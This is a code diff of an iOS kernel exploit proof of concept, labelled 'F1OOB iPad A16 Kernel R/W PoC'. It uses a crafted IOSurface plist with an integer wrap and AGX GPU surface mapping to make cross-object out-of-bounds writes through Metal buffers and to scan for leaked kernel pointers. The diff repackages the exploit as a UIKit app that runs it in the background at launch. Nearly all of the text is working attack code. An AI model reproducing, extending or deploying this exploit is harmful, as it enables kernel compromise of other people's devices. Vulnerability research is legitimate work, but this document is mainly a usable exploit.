@@ -1,6 +1,6 @@
 #import <Foundation/Foundation.h>
 #import <Metal/Metal.h>
-#import <MetalKit/MetalKit.h>
+#import <UIKit/UIKit.h>
 #import <IOKit/IOKitLib.h>
 #import <mach/mach.h>
 #import <dlfcn.h>
@@ -73,7 +73,6 @@ static uint32_t create_f1_surface_iokit(void) {
         return 0;
     }
     
-    // F1 XML with 32-bit integer wrap
     const char *xml =
         "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
         "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">"
@@ -123,7 +122,6 @@ static uint32_t create_f1_surface_iokit(void) {
 // MARK: - AGX Mapping
 
 static uint64_t agx_map_surface(uint32_t surface_id, uint64_t *span, io_connect_t *agx_conn) {
-    // Try iPad A16 GPU first (AGXAcceleratorG16P), then fallback
     io_service_t agx = IOServiceGetMatchingService(0,
         IOServiceMatching("AGXAcceleratorG16P"));
     if (!agx) {
@@ -165,9 +163,9 @@ static uint64_t agx_map_surface(uint32_t surface_id, uint64_t *span, io_connect_
     return output[0];
 }
 
-// MARK: - Cross-Object OOB Write with Kernel R/W
+// MARK: - Exploit (runs in background thread)
 
-static int test_cross_object_write(void) {
+static int run_exploit(void) {
     NSLog(@"=== F1OOB iPad A16 Kernel R/W PoC ===");
     
     if (load_iosurface() != 0) {
@@ -188,7 +186,9 @@ static int test_cross_object_write(void) {
         return -1;
     }
     
-    void *f1_base = malloc(0x10000);
+    // Use aligned allocation for Metal
+    void *f1_base = NULL;
+    posix_memalign(&f1_base, 4096, 0x10000);
     memset(f1_base, 0x41, 0x10000);
     
     id<MTLBuffer> f1_buf = [dev newBufferWithBytesNoCopy:f1_base
@@ -197,13 +197,14 @@ static int test_cross_object_write(void) {
                                              deallocator:nil];
     if (!f1_buf) {
         NSLog(@"[ERROR] F1 buffer creation failed");
+        free(f1_base);
         return -1;
     }
     
     uint64_t f1_ga = (uint64_t)f1_buf.gpuAddress;
     NSLog(@"[METAL] F1 buffer GPU address: 0x%llx", f1_ga);
     
-    // Create multiple victim buffers to increase hit chance
+    // Create victims
     id<MTLBuffer> victims[10];
     uint64_t victim_gas[10];
     
@@ -221,104 +222,91 @@ static int test_cross_object_write(void) {
         if (!victims[i]) continue;
         
         uint64_t victim_ga = victim_gas[i];
-        if (victim_ga <= f1_ga) {
-            NSLog(@"[SKIP] Victim %d not after F1", i);
-            continue;
-        }
+        if (victim_ga <= f1_ga) continue;
         
         uint64_t delta = victim_ga - f1_ga;
         NSLog(@"[XOBJ] Victim %d: delta=0x%llx span=0x%llx", i, delta, span);
         
-        if (delta >= span) {
-            NSLog(@"[SKIP] Victim %d out of F1 span", i);
+        if (delta >= span) continue;
+        
+        // SAFE: Check CPU buffer bounds before writing
+        uint64_t idx = delta / 4;
+        if (idx >= 0x10000/4) {
+            NSLog(@"[SKIP] Index %llu out of CPU buffer bounds", idx);
             continue;
         }
         
-        // Pre-touch victim
         uint32_t *victim_ptr = (uint32_t *)victims[i].contents;
         *victim_ptr = 0x47474747;
-        NSLog(@"[METAL] Victim %d pre-touched: 0x%x", i, *victim_ptr);
         
-        // Write through F1 buffer at victim's GPU address
         uint32_t *f1_ptr = (uint32_t *)f1_buf.contents;
-        uint64_t idx = delta / 4;
         f1_ptr[idx] = 0x43434343;
         
-        NSLog(@"[METAL] Wrote through F1 at index %llu", idx);
-        
-        // Check victim
         uint32_t back = *victim_ptr;
         if (back == 0x43434343) {
-            NSLog(@"[XOBJ] *** CROSS-OBJECT GPU OOB WRITE CONFIRMED on victim %d ***", i);
+            NSLog(@"[XOBJ] *** CROSS-OBJECT HIT on victim %d ***", i);
             
-            // === KERNEL POINTER LEAK ===
-            NSLog(@"[XOBJ] Scanning for kernel pointers...");
+            // Scan for kernel pointers
             int ptr_count = 0;
             for (int j = 0; j < 0x10000/8; j++) {
                 uint64_t val = ((uint64_t *)victims[i].contents)[j];
-                // Check for kernel pointers (high bits set)
-                if ((val >> 40) == 0xffffff || (val >> 44) == 0xfffff || 
-                    (val >> 48) == 0xffff || (val & 0xFFFF000000000000) == 0xFFFF000000000000) {
-                    NSLog(@"[XOBJ] Kernel pointer at offset 0x%x: 0x%llx", j*8, val);
+                if ((val >> 40) == 0xffffff || (val >> 44) == 0xfffff) {
+                    NSLog(@"[XOBJ] Kernel ptr at 0x%x: 0x%llx", j*8, val);
                     ptr_count++;
-                    if (ptr_count >= 20) break;
+                    if (ptr_count >= 10) break;
                 }
             }
             
-            if (ptr_count == 0) {
-                NSLog(@"[XOBJ] No kernel pointers found in victim");
-            } else {
-                NSLog(@"[XOBJ] Found %d potential kernel pointers", ptr_count);
-            }
-            
-            // === TEST ARBITRARY KERNEL READ ===
-            // Try to read from a known kernel address
-            // mach_trap_table at 0xfffffe0007ebc018 (unslid)
-            // With KASLR, actual address is base + 0x7ebc018
-            // We need to leak kernel base first
-            
-            NSLog(@"[KREAD] Testing arbitrary kernel read...");
-            NSLog(@"[KREAD] Need to leak kernel base from IOSurface buffer pointer");
-            
-            // The IOSurface buffer pointer is at offset +0x28 in the IOSurface structure
-            // But we need to find the IOSurface structure first
-            // This requires additional work — for now, just log the leak
-            
             return 1;
-        } else {
-            NSLog(@"[XOBJ] No hit on victim %d (victim=0x%x)", i, back);
         }
     }
     
-    NSLog(@"[XOBJ] No cross-object hit on any victim");
+    NSLog(@"[XOBJ] No cross-object hit");
     return 0;
 }
 
-// MARK: - Main
+// MARK: - App Delegate
+
+@interface AppDelegate : UIResponder <UIApplicationDelegate>
+@property (strong, nonatomic) UIWindow *window;
+@end
+
+@implementation AppDelegate
+
+- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
+    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
+    self.window.backgroundColor = [UIColor whiteColor];
+    
+    UIViewController *vc = [[UIViewController alloc] init];
+    UILabel *label = [[UILabel alloc] initWithFrame:self.window.bounds];
+    label.text = @"F1OOB Running...\nCheck Console for logs";
+    label.textAlignment = NSTextAlignmentCenter;
+    label.numberOfLines = 0;
+    vc.view = label;
+    
+    self.window.rootViewController = vc;
+    [self.window makeKeyAndVisible];
+    
+    // Run exploit in background
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+        int result = run_exploit();
+        NSLog(@"[RESULT] Exploit finished with result: %d", result);
+        
+        dispatch_async(dispatch_get_main_queue(), ^{
+            label.text = [NSString stringWithFormat:@"Exploit Result: %d\nCheck Console", result];
+        });
+    });
+    
+    return YES;
+}
+
+@end
+
+// MARK: - Main (proper UIKit lifecycle)
 
 int main(int argc, char *argv[]) {
     @autoreleasepool {
-        NSLog(@"=== F1OOB EXPLOIT STARTING ===");
-        
-        int result = test_cross_object_write();
-        
-        NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
-        NSString *logPath = [docs stringByAppendingPathComponent:@"F1OOB_iPad_result.log"];
-        
-        NSString *log = [NSString stringWithFormat:
-            @"F1OOB iPad A16 Kernel R/W Result: %d\n"
-            @"Device: %@\n"
-            @"iOS: %@\n"
-            @"Time: %@\n",
-            result,
-            [[UIDevice currentDevice] model],
-            [[UIDevice currentDevice] systemVersion],
-            [NSDate date]];
-        
-        [log writeToFile:logPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
-        NSLog(@"[OK] Log written to: %@", logPath);
-        NSLog(@"=== F1OOB EXPLOIT COMPLETE ===");
-        
-        return result;
+        NSLog(@"=== F1OOB: ENTERED MAIN ===");
+        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
     }
 }
